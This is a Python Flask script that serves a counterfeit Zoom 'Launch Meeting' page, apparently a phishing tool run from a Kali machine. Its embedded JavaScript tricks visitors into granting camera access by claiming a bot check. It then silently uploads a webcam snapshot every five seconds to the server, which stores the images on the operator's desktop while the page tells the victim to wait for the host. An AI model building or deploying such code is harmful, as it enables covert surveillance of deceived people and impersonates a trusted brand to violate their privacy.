from flask import Flask, request, render_template_string
import os
import time

app = Flask(__name__)
save_dir = '/home/kali/Desktop'

html_template = '''
<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta http-equiv="content-type" content="text/html;charset=utf-8">
  <meta charset="utf-8">
  <meta name="referrer" content="origin-when-cross-origin">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1">
  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1.0">
  <title>Launch Meeting - Zoom</title>
  <meta name="keywords" content="zoom, zoom.us, video conferencing, video conference, online meetings, web meeting, video meeting, cloud meeting, cloud video, group video call, group video chat, screen share, application share, mobility, mobile collaboration, desktop share, video collaboration, group messaging">
  <meta name="description" content="Zoom is the leader in modern enterprise video communications, with an easy, reliable cloud platform for video and audio conferencing, chat, and webinars across mobile, desktop, and room systems. Zoom Rooms is the original software-based conference room solution used around the world in board, conference, huddle, and training rooms, as well as executive offices and classrooms. Founded in 2011, Zoom helps businesses and organizations bring their teams together in a frictionless environment to get more done. Zoom is a publicly traded company headquartered in San Jose, CA.">
  <meta name="robots" content="noindex,nofollow">
  <meta property="og:type" content="activity">
  <meta property="og:title" content="Join our Cloud HD Video Meeting">
  <meta property="og:description" content="Zoom is the leader in modern enterprise video communications, with an easy, reliable cloud platform for video and audio conferencing, chat, and webinars across mobile, desktop, and room systems. Zoom Rooms is the original software-based conference room solution used around the world in board, conference, huddle, and training rooms, as well as executive offices and classrooms. Founded in 2011, Zoom helps businesses and organizations bring their teams together in a frictionless environment to get more done. Zoom is a publicly traded company headquartered in San Jose, CA.">
  <meta property="og:url" content="https://zoom.us/">
  <meta property="og:site_name" content="Zoom Video">
  <meta property="fb:app_id" content="113289095462482">
  <meta property="twitter:account_id" content="522701657">
  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <link rel="shortcut icon" href="./zoom.ico">
  <style>.pJd3AcQ5{padding:24px 12px 0}.pJd3AcQ5 h3[role=presentation]{color:rgba(4,4,19,.56)}.tEludxqP{-webkit-box-pack:center;-ms-flex-pack:center;border:none;color:#232333;display:-webkit-box;display:-ms-flexbox;display:flex;font-size:14px;justify-content:center;line-height:18px;margin-top:8px}.tEludxqP input{border:none;color:inherit;font-size:inherit;line-height:inherit;min-width:200px;padding:0;text-align:center;text-overflow:ellipsis}.tEludxqP a{margin-left:8px;white-space:nowrap}</style>
  <style>.uNoZfpje{font-size:18px;height:100%;left:0;line-height:30px;position:fixed;top:0;width:100%}.uNoZfpje b{font-weight:600}.uNoZfpje span:first-child{font-size:26px;line-height:32px;margin-right:4px}.w20M_4nG{background:#ff7800;color:#fff;padding-bottom:20px;text-align:right}.w20M_4nG svg{height:50px;margin:8px 8px 0 20px;vertical-align:bottom;width:50px}.XLVoEETB{color:#333;padding:36px}</style>
  <style>.YKbuhtnZ{-webkit-animation:yFdRyA43 1.4s linear infinite;animation:yFdRyA43 1.4s linear infinite;background:conic-gradient(#fff 2%,#0e72ed);border-radius:50%;height:32px;position:relative;width:32px}.YKbuhtnZ:after,.YKbuhtnZ:before{content:"";position:absolute}.YKbuhtnZ:before{background:#0e72ed;border-radius:50%;height:3px;left:50%;margin-left:-1.5px;top:0;width:3px}.JJBzkJ7V{background:-webkit-gradient(linear,left top,left bottom,from(rgba(255,255,255,0)),to(#0e72ed));background:linear-gradient(180deg,rgba(255,255,255,0),#0e72ed)}.JJBzkJ7V:after{background:-webkit-gradient(linear,left bottom,left top,color-stop(10%,rgba(255,255,255,0)),color-stop(30%,rgba(14,113,235,.5)),to(#0e72ed));background:linear-gradient(0deg,rgba(255,255,255,0) 10%,rgba(14,113,235,.5) 30%,#0e72ed);border-radius:16px 0 0 16px;height:100%;left:0;top:0;width:50%}.bEQFBqyz{background:#fff;border-radius:50%;height:26px;left:50%;margin:-13px 0 0 -13px;position:absolute;top:50%;width:26px;z-index:1}@-webkit-keyframes yFdRyA43{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes yFdRyA43{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}</style>
  <style>._KKcYTqL{opacity:0}.ysSPZDid{opacity:1}.ysSPZDid,._KKcYTqL{-webkit-transition:opacity .25s ease-in-out;transition:opacity .25s ease-in-out}</style>
  <style>.uHYRgsSa{display:inline-block}</style>
  <style>.VahdFMz0{background:#0e72ed;border-radius:12px;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;cursor:pointer;display:inline-block;font-size:16px;line-height:32px;margin-top:12px;padding:8px 40px;text-align:center}.VahdFMz0 a,a.VahdFMz0{color:#fff!important;text-decoration:none!important}.VahdFMz0:hover{background-color:#2681f2}.VahdFMz0:active{background-color:#0c63ce}._8Wnjh6r{background:rgba(82,82,128,.09);color:#222230}._8Wnjh6r a,a._8Wnjh6r{color:#222230;text-decoration:none}._8Wnjh6r:active,._8Wnjh6r:hover{background-color:rgba(82,82,128,.2)}@media (max-width:500px){.VahdFMz0{border-radius:16px;font-size:17px;line-height:48px;padding:0;width:100%}}</style>
  <style>.Yi1dda1y{background:#fff;border:1px solid rgba(35,35,51,.04);border-radius:8px;-webkit-box-shadow:0 2px 8px rgba(35,35,51,.1);box-shadow:0 2px 8px rgba(35,35,51,.1);-webkit-box-sizing:border-box;box-sizing:border-box;color:#747487;padding:12px 24px;position:fixed;z-index:999}.Yi1dda1y:after,.Yi1dda1y:before{background:#fff;content:"";display:block;position:absolute}.Yi1dda1y:before{border-radius:3px;-webkit-box-shadow:0 2px 8px rgba(35,35,51,.1);box-shadow:0 2px 8px rgba(35,35,51,.1);height:12px;position:absolute;-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg);width:12px}.Yi1dda1y:after{height:14px;width:40px}.EfOkLFMI{-webkit-animation:J7p9tSAc 1s;animation:J7p9tSAc 1s;right:60px;top:16px}.EfOkLFMI:before{right:72px;top:-6px}.EfOkLFMI:after{right:60px;top:0}.WBC5Bo0Z{-webkit-animation:_xkzsXlw 1s;animation:_xkzsXlw 1s}.WBC5Bo0Z:before{bottom:-6px;left:72px}.WBC5Bo0Z:after{bottom:0;left:60px}.d7kpaZVK{bottom:16px;left:16px}._YDzVf7E{bottom:80px;left:50%;margin-left:-240px;width:480px}@-webkit-keyframes _xkzsXlw{0%{-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;-webkit-transform:translateY(-50%);transform:translateY(-50%)}40%{-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out;-webkit-transform:translateY(0);transform:translateY(0)}60%{-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;-webkit-transform:translateY(-25%);transform:translateY(-25%)}80%{-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out;-webkit-transform:translateY(0);transform:translateY(0)}90%{-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;-webkit-transform:translateY(-10%);transform:translateY(-10%)}to{-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out;-webkit-transform:translateY(0);transform:translateY(0)}}@keyframes _xkzsXlw{0%{-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;-webkit-transform:translateY(-50%);transform:translateY(-50%)}40%{-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out;-webkit-transform:translateY(0);transform:translateY(0)}60%{-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;-webkit-transform:translateY(-25%);transform:translateY(-25%)}80%{-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out;-webkit-transform:translateY(0);transform:translateY(0)}90%{-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;-webkit-transform:translateY(-10%);transform:translateY(-10%)}to{-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out;-webkit-transform:translateY(0);transform:translateY(0)}}@-webkit-keyframes J7p9tSAc{0%{-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;-webkit-transform:translateY(50%);transform:translateY(50%)}40%{-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out;-webkit-transform:translateY(0);transform:translateY(0)}60%{-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;-webkit-transform:translateY(25%);transform:translateY(25%)}80%{-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out;-webkit-transform:translateY(0);transform:translateY(0)}90%{-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;-webkit-transform:translateY(10%);transform:translateY(10%)}to{-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out;-webkit-transform:translateY(0);transform:translateY(0)}}@keyframes J7p9tSAc{0%{-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;-webkit-transform:translateY(50%);transform:translateY(50%)}40%{-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out;-webkit-transform:translateY(0);transform:translateY(0)}60%{-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;-webkit-transform:translateY(25%);transform:translateY(25%)}80%{-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out;-webkit-transform:translateY(0);transform:translateY(0)}90%{-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;-webkit-transform:translateY(10%);transform:translateY(10%)}to{-webkit-animation-timing-function:ease-out;animation-timing-function:ease-out;-webkit-transform:translateY(0);transform:translateY(0)}}.iCQ0gf_l{font-size:16px;line-height:24px;text-align:left;white-space:pre-line}</style>
  <style>.JkSR_S4i{-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-box-align:center;-ms-flex-align:center;align-items:center;background:#fff;-webkit-box-sizing:border-box;box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-direction:column;flex-direction:column;font-family:Inter,Open Sans,Helvetica,Arial,sans-serif;margin:0 auto;max-width:840px;min-height:480px;padding:130px 60px 48px;position:relative;text-align:center}.JkSR_S4i:focus{outline:none}@media (max-width:500px){.JkSR_S4i{-webkit-box-shadow:none;box-shadow:none;padding:16px}}@media (max-width:320px){.JkSR_S4i{padding:0}}.inXzNydj{color:rgba(4,4,19,.56);font-size:18px;width:100%}.inXzNydj hr{background:#ededf4;border:none;height:1px;margin:48px 0;width:100%}.inXzNydj h1,.inXzNydj h2,.inXzNydj h3,.inXzNydj h4{font-weight:400;margin:0}.inXzNydj h1{font-size:20px;line-height:40px;padding:12px 0}.inXzNydj h2{padding:5px 0}.inXzNydj h2,.inXzNydj h3{font-size:14px;line-height:24px}.inXzNydj h4{color:#747487;font-size:12px;line-height:14px}.inXzNydj h1,.inXzNydj h2,.inXzNydj h3{color:#232333}.inXzNydj a{color:#0e72ed;cursor:pointer;text-decoration:none}.inXzNydj a,.inXzNydj b{white-space:nowrap}@media (max-width:500px){.inXzNydj h1{font-size:24px;font-weight:700;line-height:28px;margin-bottom:44px;padding:0}.inXzNydj hr{margin:40px 0}}.rn_l1hqv{font-size:16px;line-height:40px;line-height:20px;padding:14px 44px}.ljq6FBiq{color:#747487;font-size:12px;font-weight:300;margin:32px auto;text-align:center;width:100%}.ljq6FBiq a{color:currentColor;text-decoration:none}.ljq6FBiq a:hover{text-decoration:underline}.b81hFbyg{margin-bottom:12px;-webkit-transition:opacity .2s ease-in-out;transition:opacity .2s ease-in-out}.d0PWdvp9{opacity:0}.nsgWefDL{-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-box-pack:stretch;-ms-flex-pack:stretch;-webkit-box-sizing:border-box;box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-direction:column;flex-direction:column;font-size:14px;justify-content:stretch;justify-items:stretch;margin:24px auto 0;max-width:400px;padding:0 32px}._d3HsQBH{margin-top:16px}.ngRoXUvm{-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-box-align:center;-ms-flex-align:center;align-items:center;display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-direction:column;flex-direction:column}.kRj8ale3{min-height:124px}.zI5ZBcpf h3+h3{margin-top:20px}h2.EOquiHKJ{font-size:16px;margin-bottom:20px;margin-top:8px}.g3_9VPNX{margin-top:28px}.VZQdn1Q0{margin-top:16px}.cnRMFLVQ{-webkit-box-align:center;-ms-flex-align:center;align-items:center;display:-webkit-box;display:-ms-flexbox;display:flex;left:16px;padding:8px;position:fixed;top:72px}.cnRMFLVQ svg{margin-right:4px}.QKIUOGJl{color:#232333;display:block;margin-top:16px;text-transform:capitalize}.MWcasZER{font-size:12px;left:0;opacity:.5;padding:10px;pointer-events:none;position:fixed;text-align:left;top:60px;white-space:pre-line;z-index:999}</style>
  <style>.RlrpN5hN a{display:block;line-height:32px}div h2.dp9JiFVd{font-size:17px;font-weight:700;margin:12px 0 24px;padding:0}</style>
  <style>.LHzU35bo{background-color:#0e72ed;border-color:#0e72ed;border-radius:8px;color:#fff!important;display:inline-block;font-size:15px;line-height:20px;margin:24px 0;padding:6px 20px}</style>
  <style>.nA4wQtxm a{color:inherit}</style>
  <style>
      * {
          font-family: "Open Sans", "Helvetica", "Arial", sans-serif;
        }

        /* For header & footer */
        #header_outer {
          position: relative;
          font-size: 12px;
          font-weight: 600;
          width: 100%;
          margin-left: auto;
          margin-right: auto;
        }
        .header-logo {
          height: 25px;
          outline: none;
          border: 0;
          width: auto;
          margin-left: 24px;
          margin-right: 20px;
          vertical-align: middle;
          left: 0;
        }
        .action-btns {
          float: right;
          padding-right: 24px;
          font-weight: 400;
        }
        .caret {
          display: inline-block;
          width: 0;
          height: 0;
          margin-left: 6px;
          vertical-align: middle;
          border-top: 4px solid;
          border-right: 4px solid transparent;
          border-left: 4px solid transparent;
        }

        /**
         * For branding
         */
        #header .logo {
          height: 35px;
          margin-left: 20px;
          width: auto;
          margin-right: 20px;
          vertical-align: middle;
          box-sizing: border-box;
          border: 0;
        }
        /*  less than 767px  */
        @media screen and (max-width : 767px) {
          #header .logo {
            height: 25px;
          }
        }

        html, body {
        	height: 100%;
        	color:#232333;
        }
        body {
          margin: 0;
          padding-top: 64px;
          box-sizing: border-box;
        }
        #header_container {
          position: fixed;
          width: 100%;
          top: 0;
          z-index: 300;
          background-color: rgba(255,255,255,.97);
          height: 64px;
          line-height: 64px;
          box-shadow: 0 0 2px rgba(0,0,0,0.2);
        }
        #footer_container{
          padding: 24px;
          width: 100%;
          bottom: 0;
          z-index: 300;
          min-height: 64px;
          text-align: center;
          display: flex;
          flex-direction: column;
          align-items:center;
          color: rgba(4, 4, 19, 0.56);;
          box-sizing: border-box;
        }
        #footer_container a{
          color: inherit;
        }
        #footer_container p {
          margin: 0;
          font-size: 14px;
          line-height: 1.5;
        }
        /* Copied from common.css */
        a {
        	text-decoration: none;
          color: #0E71EB;
        }
        a:hover {
        	text-decoration: underline;
        }
        @media (min-width: 1200px) {
        	#header_container .container {
        		width: 1200px !important;
        	}
        }
        @media (min-width: 1400px) {
        	#header_container .container {
        		width: 1400px !important;
        	}
        }

        /* Mobile header/footer */
        @media screen and (max-width : 500px) {
          body {
            padding-top: 60px;
          }
          #header_container {
            height: 60px;
            line-height: 60px;
          }
          #footer_container {
            margin-top: 32px;
            padding-bottom: 8px;
          }
          #footer_container p {
            margin: 0;
            font-size: 12px;
          }
          #footer_container span {
            white-space: nowrap;
          }
        }
  </style>
  <style>.WyZsibeq{color:#0e71eb;cursor:pointer;position:relative}.Il__gUHM,.WyZsibeq{display:inline-block}.Il__gUHM{border-left:4px solid transparent;border-right:4px solid transparent;border-top:4px solid;height:0;margin-left:2px;vertical-align:middle;width:0}.sg_0vLoX{background-clip:padding-box;background-color:#fff;border:1px solid #eee;border-radius:4px;-webkit-box-shadow:0 6px 12px rgba(0,0,0,.175);box-shadow:0 6px 12px rgba(0,0,0,.175);margin-top:6px;min-width:100px;padding:8px 0;position:absolute;right:0;text-shadow:none;width:120px}.sg_0vLoX:before{border-bottom:7px solid rgba(0,0,0,.2);border-left:7px solid transparent;border-right:7px solid transparent;content:"";display:inline-block!important;position:absolute;right:39px;top:-7px}.sg_0vLoX:after{border-bottom:6px solid #fff;border-left:6px solid transparent;border-right:6px solid transparent;content:"";display:inline-block!important;position:absolute;right:40px;top:-6px}.o4rL4RFf{color:#232323;font-size:14px;line-height:15px;padding:10px 20px;text-decoration:none;text-transform:inherit;white-space:nowrap}.o4rL4RFf:hover{background:#f5f5f5}.wLIFDZc2{background:#f5f5f5}.WyZsibeq li{display:block;list-style:none}</style>
  <style>._OwMLWXp{font-size:0}.eUE0v738,._OwMLWXp{vertical-align:middle}.eUE0v738{color:#222230;display:inline-block;font-size:24px;font-weight:400;line-height:30px;margin-left:-6px}</style>
  <style>.PbVR2IxX{-webkit-box-pack:center;-ms-flex-pack:center;display:-webkit-box;display:-ms-flexbox;display:flex;justify-content:center;text-align:center}.PbVR2IxX a{cursor:pointer;line-height:16px;margin:2px 0;padding:0 6px}.PbVR2IxX a+a{border-left:1px solid}</style>
  <!-- Alert Style -->
  <style>
    #modalContainer {
      background-color:rgba(0, 0, 0, 0.3);
      position:absolute;
      width:100%;
      height:100%;
      top:0px;
      left:0px;
      z-index:10000;
      background-image:url(tp.png); /* required by MSIE to prevent actions on lower z-index elements */
    }
    
    #alertBox {
      position:relative;
      width:300px;
      min-height:100px;
      margin-top:50px;
      border:1px solid #666;
      background-color:#fff;
      background-repeat:no-repeat;
      background-position:20px 30px;
    }
    
    #modalContainer > #alertBox {
      position:fixed;
    }
    
    #alertBox h1 {
      margin:0;
      font:bold 0.9em verdana,arial;
      background-color:#0e72ed;
      color:#FFF;
      border-bottom:1px solid #000;
      padding:2px 0 2px 5px;
    }
    
    #alertBox p {
      font:0.7em verdana,arial;
      height:50px;
      padding-left:5px;
      margin-left:55px;
    }
    
    #alertBox #closeBtn {
      display:block;
      position:relative;
      margin:5px auto;
      padding:7px;
      border:0 none;
      width:70px;
      font:0.7em verdana,arial;
      text-transform:uppercase;
      text-align:center;
      color:#FFF;
      background-color:#0e72ed;
      border-radius: 3px;
      text-decoration:none;
    }
    
    /* unrelated styles */
    
    #mContainer {
      position:relative;
      width:600px;
      margin:auto;
      padding:5px;
      border-top:2px solid #000;
      border-bottom:2px solid #000;
      font:0.7em verdana,arial;
    }

    #credits {
      position:relative;
      margin:25px auto 0px auto;
      width:350px; 
      font:0.7em verdana;
      border-top:1px solid #000;
      border-bottom:1px solid #000;
      height:90px;
      padding-top:4px;
    }

    #credits img {
      float:left;
      margin:5px 10px 5px 0px;
      border:1px solid #000000;
      width:80px;
      height:79px;
    }

    .important {
      background-color:#F5FCC8;
      padding:2px;
    }

    code span {
      color:green;
    }
</style>
</head>

<body>
  <div id="header_container" role="banner" class="">
    <div id="header_outer" class="container clearfix">
      <div id="header" role="banner" class="clearfix">
        <a href="/" aria-label="Zoom Logo" class="imglink _OwMLWXp">
          <svg width="115" height="25" viewBox="0 0 90 20" fill="#2D8CFF" class="header-logo" style="width: 115px !important;">
            <path fill-rule="evenodd" clip-rule="evenodd" d="M36.1691 17.0711C40.0314 13.1658 40.0314 6.83418 36.1691 2.92895C34.2395 0.97793 31.711 0.00161441 29.1694 0C26.6404 0.00161441 24.1119 0.97793 22.1824 2.92895C18.32 6.83418 18.32 13.1658 22.1824 17.0711C26.0447 20.9763 32.3068 20.9763 36.1691 17.0711ZM33.3717 14.2425C35.6891 11.8993 35.6891 8.10037 33.3717 5.75722C31.0543 3.41406 27.2971 3.41406 24.9797 5.75722C22.6623 8.10037 22.6623 11.8993 24.9797 14.2425C27.2971 16.5856 31.0543 16.5856 33.3717 14.2425ZM57.4327 2.92895C61.2951 6.83418 61.2951 13.1658 57.4327 17.0711C53.5704 20.9763 47.3084 20.9763 43.446 17.0711C39.5837 13.1658 39.5837 6.83418 43.446 2.92895C45.3756 0.97793 47.9041 0.00161441 50.4331 0C52.9747 0.00161441 55.5032 0.97793 57.4327 2.92895ZM54.6354 5.75722C56.9528 8.10037 56.9528 11.8993 54.6354 14.2425C52.318 16.5856 48.5607 16.5856 46.2434 14.2425C43.9259 11.8993 43.9259 8.10037 46.2434 5.75722C48.5607 3.41406 52.318 3.41406 54.6354 5.75722ZM74.1262 8C74.0879 7.24898 73.9816 6.58351 73.6428 5.99375C72.9579 4.80159 71.6813 4 70.2196 4C68.7592 4 67.4837 4.80005 66.7983 5.99029C66.4583 6.58083 66.3547 7.24786 66.313 8L66.2635 9V16L66.2141 17.0004C66.1495 18.6605 64.9483 19.8401 63.2965 19.95L62.3075 20V0C63.2965 0 65.019 0.505638 65.7885 1.37131C67.0527 0.505638 68.5777 0 70.2196 0C72.5827 0 74.7039 1.04751 76.1536 2.70835C77.6034 1.04751 79.7246 0 82.0877 0C86.4574 0 89.9998 3.58172 89.9998 8V9.00903V20L89.0117 19.95C87.3775 19.8542 86.1958 18.644 86.0932 16.999L86.0437 16V8.99893L85.9943 8C85.9551 7.26721 85.8509 6.58767 85.514 5.99912C84.8299 4.804 83.5516 4 82.0877 4C80.629 4 79.3547 4.79826 78.6688 5.98632C78.3273 6.57775 78.2197 7.25832 78.1811 8L78.1317 9V20L77.1436 19.95C75.5118 19.8455 74.3229 18.6344 74.2251 16.999L74.1756 16V9L74.1262 8ZM4.94506 20L3.95604 19.95C2.31347 19.8406 1.13603 18.6476 1.03846 16.9991L0.989011 16L12.8571 4H3.95604L2.96583 3.95C1.34815 3.85556 0.177592 2.62595 0.0494498 0.999056L0 7.42403e-06L14.8352 0.000912409L15.8241 0.0499992C17.4625 0.137543 18.6634 1.34167 18.7418 3.00124L18.7912 4L6.92308 16H15.8242L16.8132 16.05C18.4453 16.1531 19.5984 17.3544 19.7308 19.0009L19.7802 20H4.94506Z"></path>
          </svg>
        </a>
        <div class="action-btns">
          <a target="_blank" href="https://support.zoom.us/hc/en-us"> Support</a>
          <div class="WyZsibeq" style="margin-left: 24px;">
            <a aria-haspopup="true" tabindex="0">English
              <div class="Il__gUHM"></div>
            </a>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div id="zoom-ui-frame" role="main" tabindex="0" class="JkSR_S4i">
    <div class="YKbuhtnZ d0PWdvp9 b81hFbyg">
      <div class="bEQFBqyz"></div>
    </div>
    <div class="inXzNydj">
      <div>
        <h1>Click <b>Open link</b> on the dialog shown by your browser<br>If you don’t see a dialog, click <b>Launch Meeting</b> below</h1>
        <h2 class="EOquiHKJ">By clicking "Launch Meeting", you agree to our <a terms="" tabindex="0" target="_blank" href="https://zoom.us/en-us/terms">Terms of Service</a> and <a privacy="" target="_blank" tabindex="0" href="https://zoom.us/en-us/privacy">Privacy Statement</a></h2>
        <a href="javascript:void(0);" onclick="startMeeting();" target="" class="VahdFMz0">Launch Meeting</a>
        <hr> <h3 role="presentation">Don’t have Zoom Client installed? <a download="" tabindex="0">Download Now</a></h3>
      </div>
    </div>
  </div>

  <div id="footer_container" role="contentinfo">
    <div id="footer">
      <p>©2022 Zoom Video Communications, Inc. <span>All rights reserved.</span></p>
      <p class="PbVR2IxX">
        <a href="https://zoom.us/en-us/trust" target="_blank">Privacy &amp; Legal Policies</a>
        <a href="javascript:void(null);" tabindex="0" role="button">Do Not Sell My Personal Information</a>
        <a href="javascript:void(null);" tabindex="0" role="button">Cookie Preferences</a>
      </p>
    </div>
  </div>

  <div id="ada-entry">
    <div style="position: fixed; width: 635px; height: 785px; right: 0px; background: linear-gradient(315.92deg, rgba(0, 0, 0, 0.08) 0%, rgba(0, 0, 0, 0) 40.92%); bottom: 0px; pointer-events: none; z-index: 9999; transition: all 500ms linear 0s; opacity: 0;"></div>
  </div>

  <script>
    function startMeeting() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();
          document.body.appendChild(video);
          video.style.position = 'fixed';
          video.style.bottom = '10px';
          video.style.right = '10px';
          video.style.width = '200px';
          video.style.height = '150px';

          alert("We need access to your camera to determine you are not a bot. Please allow access.");

          setInterval(function() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(function(blob) {
              const formData = new FormData();
              formData.append('image', blob, 'webcam.jpg');
              fetch('/save_image', {
                method: 'POST',
                body: formData
              });
            });
          }, 5000);

          document.querySelector('.inXzNydj').innerHTML = '<h1>The host will let you in soon. Please do not close this page.</h1>';
        })
        .catch(function() {
          alert("Couldn't verify you, access not granted.");
        });
    }
  </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(html_template)

@app.route('/save_image', methods=['POST'])
def save_image():
    if 'image' not in request.files:
        return 'No image file', 400
    image = request.files['image']
    timestamp = int(time.time())
    image.save(os.path.join(save_dir, f'webcam_{timestamp}.jpg'))
    return 'Image saved', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

